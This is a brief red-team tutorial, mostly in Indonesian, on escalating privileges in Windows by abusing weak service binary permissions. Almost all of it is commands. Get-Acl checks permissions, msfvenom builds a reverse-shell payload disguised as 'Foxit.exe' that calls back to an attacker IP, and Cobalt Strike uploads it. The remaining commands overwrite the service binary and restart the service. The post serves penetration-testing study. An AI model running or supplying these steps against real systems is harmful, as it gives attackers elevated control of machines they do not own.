---
title: '[Misconfig] Weak Service Binary Permissions'
date: 2023-07-25 23:22:22 +0700
categories: [Privilege Escalation, Windows Privilege Escalation]
tags: [red team, privilege escalation, what is, windows hacking, windows privilege escalation, service exploit, misconfig]       # TAG names should always be lowercase
author: nairpaa
---

**Weak Service Binary Permissions** mengacu pada kelemahan atau kerentanan dalam izin (*permission*) yang diberikan pada binary (file eksekusi) yang digunakan oleh Windows *service*. 

Ketika *service* dijalankan, ia menggunakan binary tertentu untuk menjalankan fungsi dan tugasnya. 

Jika *permission* pada binary ini tidak diatur dengan benar, penyerang dapat memanipulasi atau menggantikan binary tersebut dengan *malware*, yang akan dijalankan dengan hak istimewa *service* saat *service* tersebut dijalankan.

## 0x1 - Exploitation Stages

### Step 1: Check Binary Permission

```powershell
PS > Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
```

### Step 2: Create Malware and Upload

```bash
# Contoh buat malware dengan MSF
➜ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
```

```powershell
# Contoh upload file pada Cobalt Strike
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
```

### Step 3: Replace the Service Binary

```powershell
PS > cd "C:\Program Files\Vuln Services\"
PS > copy C:\temp\tcp-local_x64.svc.exe service
```

### Step 4: Run the Service

```powershell
C:\> sc qc VulnService2
C:\> sc stop VulnService2 
C:\> sc start VulnService2 
```

---

## 0x2 - References

- https://steflan-security.com/windows-privilege-escalation-weak-permission/
- https://pentestlab.blog/2017/03/30/weak-service-permissions/

